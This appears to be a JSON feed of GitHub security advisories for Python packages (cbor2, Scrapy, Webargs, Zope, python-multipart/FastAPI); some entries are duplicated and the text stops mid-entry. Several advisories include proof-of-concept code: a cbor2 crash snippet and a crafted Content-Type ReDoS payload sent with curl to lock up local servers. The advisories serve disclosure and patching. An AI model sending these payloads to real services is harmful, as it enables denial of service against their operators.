{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>Pyhtml2pdf version 0.0.6 allows an external attacker to remotely obtain</p>\n<p>arbitrary local files. This is possible because the application does not</p>\n<p>validate the HTML content entered by the user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1647\">https://nvd.nist.gov/vuln/detail/CVE-2024-1647</a></li>\n<li><a href=\"https://fluidattacks.com/advisories/oliver\">https://fluidattacks.com/advisories/oliver</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p3rv-qj56-2fqx\">https://github.com/advisories/GHSA-p3rv-qj56-2fqx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p3rv-qj56-2fqx",
            "title": "[pyhtml2pdf] Cross-site Scripting in Pyhtml2pdf",
            "date_modified": "2024-02-21T00:15:56.000Z",
            "date_published": "2024-02-20T03:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p3rv-qj56-2fqx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Ever since <a href=\"https://github.com/agronholm/cbor2/pull/204\">https://github.com/agronholm/cbor2/pull/204</a> (or specifically <a href=\"https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542\">https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542</a>) was merged, I can create a reproducible crash when running the snippet under PoC on a current Debian bullseye aarm64 on a Raspberry Pi 3 (I was <strong>not</strong> able to reproduce this on my x86_64 Laptop with Python 3.11; I suspect because there is enough memory to allocate still)</p>\n<h2 id=\"details\">Details</h2>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-py\">import json\nimport concurrent.futures\nimport cbor2\n\ndef test():\n    obj = \"x\" * 131128\n    cbor_enc = cbor2.dumps(obj)\n    return cbor2.loads(cbor_enc)\n\nwith concurrent.futures.ProcessPoolExecutor() as executor:\n    future = executor.submit(test)\n    print(future.result())\n</code></pre>\n<pre><code>malloc(): unsorted double linked list corrupted\nTraceback (most recent call last):\n  File \"test.py\", line 14, in &lt;module&gt;\n    print(future.result())\n  File \"/usr/lib/python3.9/concurrent/futures/_base.py\", line 440, in result\n    return self.__get_result()\n  File \"/usr/lib/python3.9/concurrent/futures/_base.py\", line 389, in __get_result\n    raise self._exception\nconcurrent.futures.process.BrokenProcessPool: A process in the process pool was terminated abruptly while the future was running or pending.\n</code></pre>\n<p>If one calls it without the indirection via the pool executor, a SystemError is shown that hides the buffer overflow.</p>\n<pre><code class=\"language-py\">import json\nimport cbor2\n\ndef test():\n    obj = \"x\" * 131128\n    cbor_enc = cbor2.dumps(obj)\n    return cbor2.loads(cbor_enc)\n\nprint(test())\n</code></pre>\n<pre><code>Traceback (most recent call last):\n  File \"test.py\", line 12, in &lt;module&gt;\n    print(test())\n  File \"test.py\", line 9, in test\n    return cbor2.loads(cbor_enc)\nSystemError: &lt;built-in function loads&gt; returned NULL without setting an error\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can crash a service using cbor2 to parse a CBOR binary by sending a long enough object.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m\">https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-26134\">https://nvd.nist.gov/vuln/detail/CVE-2024-26134</a></li>\n<li><a href=\"https://github.com/agronholm/cbor2/pull/204\">https://github.com/agronholm/cbor2/pull/204</a></li>\n<li><a href=\"https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542\">https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542</a></li>\n<li><a href=\"https://github.com/agronholm/cbor2/commit/4de6991ba29bf2290d7b9d83525eda7d021873df\">https://github.com/agronholm/cbor2/commit/4de6991ba29bf2290d7b9d83525eda7d021873df</a></li>\n<li><a href=\"https://github.com/agronholm/cbor2/releases/tag/5.6.2\">https://github.com/agronholm/cbor2/releases/tag/5.6.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-375g-39jq-vq7m\">https://github.com/advisories/GHSA-375g-39jq-vq7m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-375g-39jq-vq7m",
            "title": "[cbor2] Potential buffer overflow in CBOR2 decoder",
            "date_modified": "2024-02-21T00:09:08.000Z",
            "date_published": "2024-02-21T00:09:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-375g-39jq-vq7m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Scrapy 1.4 allows remote attackers to cause a denial of service (memory consumption) via large files because arbitrarily many files are read into memory, which is especially problematic if the files are then individually written in a separate thread to a slow storage resource, as demonstrated by interaction between dataReceived (in core/downloader/handlers/http11.py) and S3FilesStore.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-14158\">https://nvd.nist.gov/vuln/detail/CVE-2017-14158</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/issues/482\">https://github.com/scrapy/scrapy/issues/482</a></li>\n<li><a href=\"http://blog.csdn.net/wangtua/article/details/75228728\">http://blog.csdn.net/wangtua/article/details/75228728</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/blob/8b7a4d62a95e8f605e5dfb4e0b4f299e6403dc12/vulns/scrapy/PYSEC-2017-83.yaml\">https://github.com/pypa/advisory-database/blob/8b7a4d62a95e8f605e5dfb4e0b4f299e6403dc12/vulns/scrapy/PYSEC-2017-83.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h7wm-ph43-c39p\">https://github.com/advisories/GHSA-h7wm-ph43-c39p</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2017-83.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2017-83.yaml</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h7wm-ph43-c39p",
            "title": "[scrapy] Scrapy denial of service vulnerability",
            "date_modified": "2024-02-20T19:56:53.000Z",
            "date_published": "2022-05-17T01:16:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h7wm-ph43-c39p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>flaskparser.py in Webargs 5.x through 5.5.2 doesn't check that the Content-Type header is application/json when receiving JSON input. If the request body is valid JSON, it will accept it even if the content type is application/x-www-form-urlencoded. This allows for JSON POST requests to be made across domains, leading to CSRF.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-7965\">https://nvd.nist.gov/vuln/detail/CVE-2020-7965</a></li>\n<li><a href=\"https://github.com/marshmallow-code/webargs/commit/b9ee8b0aa668207a363d9fd21d967eeadb975c3e\">https://github.com/marshmallow-code/webargs/commit/b9ee8b0aa668207a363d9fd21d967eeadb975c3e</a></li>\n<li><a href=\"https://webargs.readthedocs.io/en/latest/changelog.html#b4-2020-01-28\">https://webargs.readthedocs.io/en/latest/changelog.html#b4-2020-01-28</a></li>\n<li><a href=\"https://webargs.readthedocs.io/en/latest/changelog.html#id11\">https://webargs.readthedocs.io/en/latest/changelog.html#id11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fjq3-5pxw-4wj4\">https://github.com/advisories/GHSA-fjq3-5pxw-4wj4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fjq3-5pxw-4wj4",
            "title": "[webargs] Cross-Site Request Forgery in Webargs",
            "date_modified": "2024-02-20T15:57:22.000Z",
            "date_published": "2021-04-07T21:06:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fjq3-5pxw-4wj4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>ZServer in Zope 2.10.x before 2.10.12 and 2.11.x before 2.11.7 allows remote attackers to cause a denial of service (crash of worker threads) via vectors that trigger uncaught exceptions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2010-3198\">https://nvd.nist.gov/vuln/detail/CVE-2010-3198</a></li>\n<li><a href=\"https://bugs.launchpad.net/zope2/+bug/627988\">https://bugs.launchpad.net/zope2/+bug/627988</a></li>\n<li><a href=\"https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html\">https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html</a></li>\n<li><a href=\"http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt\">http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt</a></li>\n<li><a href=\"http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt\">http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac\">https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4\">https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4</a></li>\n<li><a href=\"https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939\">https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qh4q-fwf8-qqrw\">https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qh4q-fwf8-qqrw",
            "title": "[Zope] Zope Denial of Service (DoS) vulnerability in ZServer",
            "date_modified": "2024-02-18T05:06:45.000Z",
            "date_published": "2022-05-17T05:48:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qh4q-fwf8-qqrw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>ZServer in Zope 2.10.x before 2.10.12 and 2.11.x before 2.11.7 allows remote attackers to cause a denial of service (crash of worker threads) via vectors that trigger uncaught exceptions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2010-3198\">https://nvd.nist.gov/vuln/detail/CVE-2010-3198</a></li>\n<li><a href=\"https://bugs.launchpad.net/zope2/+bug/627988\">https://bugs.launchpad.net/zope2/+bug/627988</a></li>\n<li><a href=\"https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html\">https://mail.zope.org/pipermail/zope-announce/2010-September/002247.html</a></li>\n<li><a href=\"http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt\">http://www.zope.org/Products/Zope/2.10.12/CHANGES.txt</a></li>\n<li><a href=\"http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt\">http://www.zope.org/Products/Zope/2.11.7/CHANGES.txt</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac\">https://github.com/zopefoundation/Zope/commit/0f2f56f63e4a4d695ee670e02b317e900550dbac</a></li>\n<li><a href=\"https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4\">https://github.com/zopefoundation/Zope/commit/e03a5f036d42ed2426886c9035fe018eeec65de4</a></li>\n<li><a href=\"https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939\">https://web.archive.org/web/20200229173503/http://www.securityfocus.com/bid/42939</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qh4q-fwf8-qqrw\">https://github.com/advisories/GHSA-qh4q-fwf8-qqrw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qh4q-fwf8-qqrw",
            "title": "[Zope] Zope Denial of Service (DoS) vulnerability in ZServer",
            "date_modified": "2024-02-18T05:06:45.000Z",
            "date_published": "2022-05-17T05:48:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qh4q-fwf8-qqrw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using form data, <code>python-multipart</code> uses a Regular Expression to parse the HTTP <code>Content-Type</code> header, including options.</p>\n<p>An attacker could send a custom-made <code>Content-Type</code> option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.</p>\n<p>This can create a ReDoS (Regular expression Denial of Service): <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></p>\n<p>This only applies when the app uses form data, parsed with <code>python-multipart</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>A regular HTTP <code>Content-Type</code> header could look like:</p>\n<pre><code>Content-Type: text/html; charset=utf-8\n</code></pre>\n<p><code>python-multipart</code> parses the option with this RegEx: <a href=\"https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></p>\n<p>A custom option could be made and sent to the server to break it with:</p>\n<pre><code>Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>Create a simple WSGI application, that just parses the <code>Content-Type</code>, and run it with <code>python main.py</code>:</p>\n<pre><code class=\"language-Python\"># main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n</code></pre>\n<p>Then send the attacking request with:</p>\n<pre><code class=\"language-console\">$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.</p>\n<h3 id=\"original-report\">Original Report</h3>\n<p>This was originally reported to FastAPI as an email to <a href=\"mailto:security@tiangolo.com\">security@tiangolo.com</a>, sent via <a href=\"https://huntr.com/\">https://huntr.com/</a>, the original reporter is Marcello, <a href=\"https://github.com/byt3bl33d3r\">https://github.com/byt3bl33d3r</a></p>\n<details>\n<summary>Original report to FastAPI</summary>\n\n<p>Hey Tiangolo!</p>\n<p>My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).</p>\n<p>Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:</p>\n<pre><code class=\"language-Python\">from typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n</code></pre>\n<p>I'm running the above with uvicorn with the following command:</p>\n<pre><code class=\"language-console\">uvicorn server:app\n</code></pre>\n<p>Then run the following cUrl command:</p>\n<pre><code>curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n</code></pre>\n<p>You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%</p>\n<p>You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.</p>\n<p>If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.</p>\n<p>Cheers</p>\n<h4 id=\"impact-1\">Impact</h4>\n<p>An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.</p>\n<h4 id=\"occurrences\">Occurrences</h4>\n<p><a href=\"https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586\">params.py L586</a></p>\n</details>\n### References\n\n<ul>\n<li><a href=\"https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n<li><a href=\"https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4\">https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4</a></li>\n<li><a href=\"https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></li>\n<li><a href=\"https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238\">https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389\">https://github.com/tiangolo/fastapi/security/advisories/GHSA-qf9m-vfgh-m389</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24762\">https://nvd.nist.gov/vuln/detail/CVE-2024-24762</a></li>\n<li><a href=\"https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5\">https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc\">https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml</a></li>\n<li><a href=\"https://github.com/tiangolo/fastapi/releases/tag/0.109.1\">https://github.com/tiangolo/fastapi/releases/tag/0.109.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p",
            "title": "[starlette] python-multipart vulnerable to Content-Type Header ReDoS",
            "date_modified": "2024-02-16T23:41:49.000Z",
            "date_published": "2024-02-12T17:28:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2jv5-9r88-3w3p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using form data, <code>python-multipart</code> uses a Regular Expression to parse the HTTP <code>Content-Type</code> header, including options.</p>\n<p>An attacker could send a custom-made <code>Content-Type</code> option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.</p>\n<p>This can create a ReDoS (Regular expression Denial of Service): <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></p>\n<p>This only applies when the app uses form data, parsed with <code>python-multipart</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>A regular HTTP <code>Content-Type</code> header could look like:</p>\n<pre><code>Content-Type: text/html; charset=utf-8\n</code></pre>\n<p><code>python-multipart</code> parses the option with this RegEx: <a href=\"https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></p>\n<p>A custom option could be made and sent to the server to break it with:</p>\n<pre><code>Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<p>Create a simple WSGI application, that just parses the <code>Content-Type</code>, and run it with <code>python main.py</code>:</p>\n<pre><code class=\"language-Python\"># main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n</code></pre>\n<p>Then send the attacking request with:</p>\n<pre><code class=\"language-console\">$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.</p>\n<h3 id=\"original-report\">Original Report</h3>\n<p>This was originally reported to FastAPI as an email to <a href=\"mailto:security@tiangolo.com\">security@tiangolo.com</a>, sent via <a href=\"https://huntr.com/\">https://huntr.com/</a>, the original reporter is Marcello, <a href=\"https://github.com/byt3bl33d3r\">https://github.com/byt3bl33d3r</a></p>\n<details>\n<summary>Original report to FastAPI</summary>\n\n<p>Hey Tiangolo!</p>\n<p>My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).</p>\n<p>Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:</p>\n<pre><code class=\"language-Python\">from typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n</code></pre>\n<p>I'm running the above with uvicorn with the following command:</p>\n<pre><code class=\"language-console\">uvicorn server:app\n</code></pre>\n<p>Then run the following cUrl command:</p>\n<pre><code>curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n</code></pre>\n<p>You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%</p>\n<p>You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.</p>\n<p>If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.</p>\n<p>Cheers</p>\n<h4 